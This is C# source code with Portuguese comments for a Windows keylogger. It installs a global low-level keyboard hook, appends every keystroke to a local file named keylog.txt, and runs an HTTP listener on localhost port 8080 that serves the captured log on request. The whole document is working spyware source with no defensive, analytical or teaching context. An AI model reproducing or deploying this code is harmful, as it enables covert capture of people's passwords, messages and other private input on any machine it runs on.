using System;
using System.IO;
using System.Net;
using System.Text;
using System.Runtime.InteropServices;
using System.Windows.Forms;

class Program
{
    private const int WH_KEYBOARD_LL = 13; // ID do hook de teclado global
    private static readonly string _filePath = "keylog.txt"; // Caminho para o arquivo de log
    private static HttpListener _listener;
    private const string _urlPrefix = "http://localhost:8080/"; // Prefixo da URL do servidor

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    static void Main()
    {
        // Configurar e iniciar o servidor HTTP
        StartHttpServer();

        // Iniciar o hook de teclado
        _hookID = SetHook(_proc);
        Application.Run(); // Mantenha a aplicação em execução
        UnhookWindowsHookEx(_hookID);

        // Após terminar o registro de teclas, pare o servidor HTTP
        StopHttpServer();
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (var curProcess = System.Diagnostics.Process.GetCurrentProcess())
        using (var curModule = curProcess.MainModule)
        {
            IntPtr moduleHandle = GetModuleHandle(curModule.ModuleName);
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc, moduleHandle, 0);
        }
    }

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && (wParam == (IntPtr)0x0100 || wParam == (IntPtr)0x0104))
        {
            int vkCode = Marshal.ReadInt32(lParam);
            char keyChar = (char)vkCode;

            // Adiciona a tecla pressionada ao arquivo de log
            File.AppendAllText(_filePath, keyChar.ToString());

            Console.Write(keyChar); // Exibir no console (opcional)
        }

        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private static void StartHttpServer()
    {
        _listener = new HttpListener();
        _listener.Prefixes.Add(_urlPrefix);
        _listener.Start();
        Console.WriteLine("Servidor HTTP iniciado em " + _urlPrefix);

        // Inicie um thread para lidar com requisições
        System.Threading.ThreadPool.QueueUserWorkItem(state =>
        {
            while (true)
            {
                try
                {
                    var context = _listener.GetContext();
                    var request = context.Request;
                    var response = context.Response;

                    Console.WriteLine("Recebido pedido para " + request.Url.AbsolutePath);

                    // Servir o arquivo keylog.txt
                    if (request.Url.AbsolutePath == "/" + Path.GetFileName(_filePath))
                    {
                        try
                        {
                            byte[] fileData = File.ReadAllBytes(_filePath);
                            response.ContentType = "text/plain";
                            response.ContentLength64 = fileData.Length;
                            response.OutputStream.Write(fileData, 0, fileData.Length);
                        }
                        catch (Exception ex)
                        {
                            Console.WriteLine("Erro ao ler o arquivo: " + ex.Message);
                            response.StatusCode = (int)HttpStatusCode.InternalServerError;
                        }
                    }
                    else
                    {
                        response.StatusCode = (int)HttpStatusCode.NotFound;
                    }

                    response.OutputStream.Close();
                }
                catch (HttpListenerException ex)
                {
                    // O HttpListener pode lançar exceções se for interrompido
                    Console.WriteLine("Servidor HTTP encerrado: " + ex.Message);
                    break;
                }
            }
        });
    }

    private static void StopHttpServer()
    {
        _listener.Stop();
        _listener.Close();
        Console.WriteLine("Servidor HTTP parado.");
    }
}
